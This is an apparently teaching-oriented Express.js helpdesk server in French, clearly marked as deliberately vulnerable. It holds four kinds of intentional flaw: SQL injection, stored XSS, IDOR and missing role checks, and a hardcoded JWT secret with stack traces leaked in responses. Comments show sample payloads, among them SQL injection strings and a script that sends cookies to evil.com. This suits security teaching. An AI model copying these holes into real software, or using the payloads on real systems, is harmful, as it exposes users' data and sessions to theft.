/**
 * server.vulnerable.js – VERSION VOLONTAIREMENT VULNÉRABLE
 *
 * ╔═══════════════════════════════════════════════════════════════════════╗
 * ║  ⚠️  CE FICHIER CONTIENT 4 FAILLES DE SÉCURITÉ INTENTIONNELLES     ║
 * ║      NE JAMAIS UTILISER EN PRODUCTION !                             ║
 * ║                                                                      ║
 * ║  Faille 1 : SQL Injection        (recherche par concaténation)      ║
 * ║  Faille 2 : XSS Stocké           (commentaires sans sanitization)   ║
 * ║  Faille 3 : IDOR                 (pas de contrôle d'accès)          ║
 * ║  Faille 4 : Secret exposé+Debug  (clé JWT en dur + stack trace)     ║
 * ╚═══════════════════════════════════════════════════════════════════════╝
 *
 * Ce fichier est utilisé à des fins pédagogiques pour le projet DevSecOps.
 * Il montre les vulnérabilités que la version sécurisée (server.js) corrige.
 *
 * Pour le lancer (environnement de test uniquement) :
 *   node server.vulnerable.js
 */

const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const pool = require("./db");

const app = express();
const PORT = process.env.PORT || 3000;

// ╔═══════════════════════════════════════════════════════════════════════╗
// ║  FAILLE 4a : x-powered-by pas désactivé → divulgue le framework    ║
// ╚═══════════════════════════════════════════════════════════════════════╝
// app.disable("x-powered-by");  // ❌ Volontairement commenté

app.use(cors());
app.use(express.json());

// ╔═══════════════════════════════════════════════════════════════════════╗
// ║  FAILLE 4b : Secret JWT codé en dur dans le code source             ║
// ║  → Si le dépôt est public, le secret est compromis                  ║
// ║  → Permet de forger des tokens JWT arbitraires                      ║
// ╚═══════════════════════════════════════════════════════════════════════╝
const JWT_SECRET = "super-secret-helpdesk-key-2024"; // ❌ FAILLE : secret en dur !

function signerToken(utilisateur) {
  return jwt.sign(
    { id: utilisateur.id, identifiant: utilisateur.identifiant, role: utilisateur.role },
    JWT_SECRET,
    { expiresIn: "8h" }
  );
}

function verifierToken(req, res, next) {
  const authHeader = req.headers["authorization"];
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ message: "Token manquant." });
  }
  try {
    req.utilisateur = jwt.verify(authHeader.split(" ")[1], JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ message: "Token invalide." });
  }
}

// ── Initialisation de la base ───────────────────────────────────────────
async function initialiserBaseDeDonnees() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS utilisateurs (
      id SERIAL PRIMARY KEY,
      identifiant VARCHAR(80) UNIQUE NOT NULL,
      mot_de_passe VARCHAR(255) NOT NULL,
      role VARCHAR(20) NOT NULL DEFAULT 'utilisateur'
    );
  `);

  await pool.query(`CREATE SEQUENCE IF NOT EXISTS ticket_number_seq START WITH 1043;`);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS tickets (
      id VARCHAR(20) PRIMARY KEY DEFAULT ('HD-' || nextval('ticket_number_seq')),
      titre VARCHAR(200) NOT NULL,
      demandeur VARCHAR(120) NOT NULL,
      categorie VARCHAR(50) NOT NULL,
      priorite VARCHAR(20) NOT NULL,
      statut VARCHAR(30) NOT NULL DEFAULT 'Ouvert',
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS commentaires (
      id SERIAL PRIMARY KEY,
      ticket_id VARCHAR(20) NOT NULL REFERENCES tickets(id) ON DELETE CASCADE,
      auteur VARCHAR(80) NOT NULL,
      contenu TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);

  // Seed data
  const c = await pool.query("SELECT id FROM utilisateurs WHERE identifiant = $1", ["agent"]);
  if (c.rowCount === 0) {
    const h1 = await bcrypt.hash("agent1234", 10);
    await pool.query("INSERT INTO utilisateurs (identifiant, mot_de_passe, role) VALUES ($1,$2,$3)", ["agent", h1, "agent"]);
    const h2 = await bcrypt.hash("user1234", 10);
    await pool.query("INSERT INTO utilisateurs (identifiant, mot_de_passe, role) VALUES ($1,$2,$3)", ["youssef", h2, "utilisateur"]);
  }

  await pool.query(`
    INSERT INTO tickets (id, titre, demandeur, categorie, priorite, statut)
    VALUES
      ('HD-1042', 'Problème de connexion au compte', 'agent', 'Compte', 'Haute', 'Ouvert'),
      ('HD-1041', 'Installation de Microsoft Teams', 'youssef', 'Logiciel', 'Normale', 'En cours')
    ON CONFLICT (id) DO NOTHING;
  `);
}

// ═══════════════════════════════════════════════════════════════════════
//  ROUTES
// ═══════════════════════════════════════════════════════════════════════

app.get("/api/health", async (req, res) => {
  try {
    await pool.query("SELECT 1");
    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 4c : Informations de debug exposées dans la réponse     ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    res.json({
      status: "ok",
      debug: {
        node_version: process.version,
        platform: process.platform,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        env: process.env.NODE_ENV || "development",
        jwt_secret_length: JWT_SECRET.length, // ❌ divulgue la taille du secret
      },
    });
  } catch (error) {
    res.status(500).json({ status: "error", error: error.message, stack: error.stack });
  }
});

// ── Auth : Login ────────────────────────────────────────────────────────
app.post("/api/auth/login", async (req, res) => {
  const { identifiant, motDePasse } = req.body;
  if (!identifiant || !motDePasse)
    return res.status(400).json({ message: "Identifiant et mot de passe requis." });

  try {
    const r = await pool.query(
      "SELECT id, identifiant, mot_de_passe, role FROM utilisateurs WHERE identifiant = $1",
      [identifiant.trim()]
    );
    if (r.rowCount === 0 || !(await bcrypt.compare(motDePasse, r.rows[0].mot_de_passe)))
      return res.status(401).json({ message: "Identifiant ou mot de passe incorrect." });

    const u = r.rows[0];
    const token = signerToken(u);
    res.json({ token, utilisateur: { id: u.id, identifiant: u.identifiant, role: u.role } });
  } catch (error) {
    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 4d : Stack trace exposée dans la réponse d'erreur       ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    res.status(500).json({
      message: "Erreur serveur",
      error: error.message,     // ❌ divulgue l'erreur
      stack: error.stack,       // ❌ divulgue la stack trace complète
    });
  }
});

app.post("/api/auth/logout", verifierToken, (req, res) => {
  res.json({ message: "Déconnexion réussie." });
});

// ── Tickets : Liste ─────────────────────────────────────────────────────
app.get("/api/tickets", verifierToken, async (req, res) => {
  try {
    const { q } = req.query;

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 1 : SQL Injection via concaténation de chaîne           ║
    // ║  → L'attaquant peut injecter du SQL via le paramètre ?q=        ║
    // ║  Exemple d'attaque :                                             ║
    // ║    GET /api/tickets?q=' OR 1=1 --                               ║
    // ║    GET /api/tickets?q=' UNION SELECT * FROM utilisateurs --      ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    let query;
    if (q) {
      // ❌ VULNÉRABLE : concaténation directe de l'entrée utilisateur dans la requête SQL
      query = `SELECT id, titre, demandeur, categorie, priorite, statut, created_at
               FROM tickets
               WHERE titre ILIKE '%${q}%'
                  OR id ILIKE '%${q}%'
                  OR demandeur ILIKE '%${q}%'
               ORDER BY created_at DESC`;
    } else {
      query = `SELECT id, titre, demandeur, categorie, priorite, statut, created_at
               FROM tickets ORDER BY created_at DESC`;
    }

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 3a : IDOR – Pas de filtrage par utilisateur             ║
    // ║  → Un utilisateur simple voit TOUS les tickets, pas seulement   ║
    // ║    les siens. Il peut voir les tickets d'autres utilisateurs.    ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    // ❌ Pas de vérification du rôle : tous les utilisateurs voient tous les tickets
    const resultat = await pool.query(query);
    res.json(resultat.rows);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Tickets : Détail ────────────────────────────────────────────────────
app.get("/api/tickets/:id", verifierToken, async (req, res) => {
  try {
    const resultat = await pool.query("SELECT * FROM tickets WHERE id = $1", [req.params.id]);
    if (resultat.rowCount === 0)
      return res.status(404).json({ message: "Ticket introuvable." });

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 3b : IDOR – Pas de vérification du propriétaire         ║
    // ║  → N'importe quel utilisateur authentifié peut voir n'importe    ║
    // ║    quel ticket, même ceux qui ne lui appartiennent pas.          ║
    // ║  Exemple d'attaque :                                             ║
    // ║    Un utilisateur "youssef" peut voir les tickets de "admin"     ║
    // ║    en faisant GET /api/tickets/HD-1042                           ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    // ❌ Pas de contrôle d'accès par propriétaire
    res.json(resultat.rows[0]);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Tickets : Créer ─────────────────────────────────────────────────────
app.post("/api/tickets", verifierToken, async (req, res) => {
  const { titre, demandeur, categorie, priorite, statut } = req.body;
  if (!titre || !demandeur || !categorie || !priorite)
    return res.status(400).json({ message: "Champs obligatoires manquants." });

  try {
    const r = await pool.query(
      `INSERT INTO tickets (titre,demandeur,categorie,priorite,statut) VALUES ($1,$2,$3,$4,$5) RETURNING *`,
      [titre, demandeur, categorie, priorite, statut || "Ouvert"]
    );
    res.status(201).json(r.rows[0]);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Tickets : Modifier statut ───────────────────────────────────────────
// ❌ Pas de exigerRole("agent") : n'importe qui peut modifier le statut
app.patch("/api/tickets/:id/statut", verifierToken, async (req, res) => {
  const { statut } = req.body;
  if (!["Ouvert", "En cours", "Résolu"].includes(statut))
    return res.status(400).json({ message: "Statut invalide." });

  try {
    const r = await pool.query(`UPDATE tickets SET statut=$1 WHERE id=$2 RETURNING *`, [statut, req.params.id]);
    if (r.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });
    res.json(r.rows[0]);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Tickets : Supprimer ─────────────────────────────────────────────────
// ❌ Pas de exigerRole("agent") : n'importe qui peut supprimer
app.delete("/api/tickets/:id", verifierToken, async (req, res) => {
  try {
    const r = await pool.query("DELETE FROM tickets WHERE id=$1 RETURNING id", [req.params.id]);
    if (r.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });
    res.json({ message: "Ticket supprimé.", id: r.rows[0].id });
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Commentaires : Lister ───────────────────────────────────────────────
app.get("/api/tickets/:id/comments", verifierToken, async (req, res) => {
  try {
    const ticket = await pool.query("SELECT demandeur FROM tickets WHERE id=$1", [req.params.id]);
    if (ticket.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });

    // ❌ FAILLE 3c : pas de vérification du propriétaire pour les commentaires
    const r = await pool.query(
      "SELECT * FROM commentaires WHERE ticket_id=$1 ORDER BY created_at ASC",
      [req.params.id]
    );
    res.json(r.rows);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Commentaires : Ajouter ──────────────────────────────────────────────
app.post("/api/tickets/:id/comments", verifierToken, async (req, res) => {
  const { contenu } = req.body;
  if (!contenu || !contenu.trim())
    return res.status(400).json({ message: "Commentaire vide." });

  try {
    const ticket = await pool.query("SELECT demandeur FROM tickets WHERE id=$1", [req.params.id]);
    if (ticket.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 2 : XSS Stocké                                          ║
    // ║  → Le contenu du commentaire est stocké et renvoyé tel quel      ║
    // ║    sans aucune sanitization ni échappement.                       ║
    // ║  → Si le frontend utilise dangerouslySetInnerHTML ou un rendu     ║
    // ║    HTML brut, le script sera exécuté dans le navigateur.          ║
    // ║  Exemple d'attaque :                                              ║
    // ║    POST contenu: "<script>document.location='https://evil.com/   ║
    // ║    steal?cookie='+document.cookie</script>"                       ║
    // ║  Ou bien :                                                        ║
    // ║    POST contenu: "<img src=x onerror=alert('XSS')>"               ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    // ❌ Pas de sanitization du contenu – stocké et renvoyé tel quel
    // ❌ Pas de limitation de longueur
    const r = await pool.query(
      `INSERT INTO commentaires (ticket_id, auteur, contenu) VALUES ($1,$2,$3) RETURNING *`,
      [req.params.id, req.utilisateur.identifiant, contenu] // ❌ pas de .trim() ni d'échappement
    );

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 2b : Réponse HTML avec contenu non échappé               ║
    // ║  → L'endpoint renvoie aussi le commentaire en HTML brut          ║
    // ║    pour démontrer le XSS dans une vue alternative                 ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    // On ajoute un endpoint HTML pour la démonstration XSS
    res.status(201).json(r.rows[0]);
  } catch (error) {
    res.status(500).json({ message: "Erreur", error: error.message, stack: error.stack });
  }
});

// ── Route de démonstration XSS (rendu HTML brut) ────────────────────────
app.get("/api/tickets/:id/comments/html", verifierToken, async (req, res) => {
  try {
    const r = await pool.query(
      "SELECT * FROM commentaires WHERE ticket_id=$1 ORDER BY created_at ASC",
      [req.params.id]
    );

    // ╔═══════════════════════════════════════════════════════════════════╗
    // ║  FAILLE 2c : Rendu HTML sans échappement                         ║
    // ║  → Les commentaires sont injectés directement dans le HTML       ║
    // ╚═══════════════════════════════════════════════════════════════════╝
    let html = "<html><body><h1>Commentaires</h1>";
    for (const c of r.rows) {
      // ❌ VULNÉRABLE : contenu injecté dans le HTML sans échappement
      html += `<div class="comment">
        <strong>${c.auteur}</strong> – ${new Date(c.created_at).toLocaleString("fr-FR")}
        <p>${c.contenu}</p>
      </div>`;
    }
    html += "</body></html>";

    res.setHeader("Content-Type", "text/html");
    res.send(html);
  } catch (error) {
    res.status(500).send(`<pre>Erreur: ${error.message}\n${error.stack}</pre>`);
  }
});

// ╔═══════════════════════════════════════════════════════════════════════╗
// ║  FAILLE 4e : Error handler qui expose la stack trace complète       ║
// ║  → Permet à un attaquant de découvrir la structure du code,          ║
// ║    les chemins des fichiers, les bibliothèques utilisées, etc.       ║
// ╚═══════════════════════════════════════════════════════════════════════╝
app.use((err, req, res, _next) => {
  // ❌ VULNÉRABLE : stack trace exposée
  res.status(500).json({
    message: "Erreur interne",
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
  });
});

// ═══════════════════════════════════════════════════════════════════════
//  DÉMARRAGE
// ═══════════════════════════════════════════════════════════════════════

async function demarrerServeur() {
  try {
    await initialiserBaseDeDonnees();
    console.log("✔ Base de données initialisée (VERSION VULNÉRABLE).");
    app.listen(PORT, () => {
      console.log(`⚠️  Backend HelpDesk VULNÉRABLE démarré sur http://localhost:${PORT}`);
      console.log("⚠️  Ce serveur contient des failles intentionnelles. Ne pas utiliser en production !");
    });
  } catch (error) {
    console.error("Échec de démarrage :", error.message);
    process.exit(1);
  }
}

demarrerServeur();

module.exports = app;
